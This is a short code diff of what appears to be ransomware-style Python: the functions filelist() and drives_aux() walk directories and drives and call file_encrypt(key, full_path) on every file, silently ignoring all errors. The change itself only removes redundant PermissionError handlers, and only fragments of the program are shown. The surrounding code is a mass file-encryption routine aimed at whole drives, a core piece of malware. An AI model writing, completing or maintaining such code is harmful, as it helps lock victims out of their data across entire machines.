@@ -47,8 +47,6 @@ def filelist():
                                 try:
                                     full_path = os.path.join(root, file)
                                     file_encrypt(key, full_path)
-                                except PermissionError:
-                                    pass
                                 except:
                                     pass
                                 
@@ -77,7 +75,5 @@ def drives_aux():
                                     try:
                                         full_path = os.path.join(root, file)
                                         file_encrypt(key, full_path)
-                                    except PermissionError:
-                                        pass
                                     except:
                                         pass
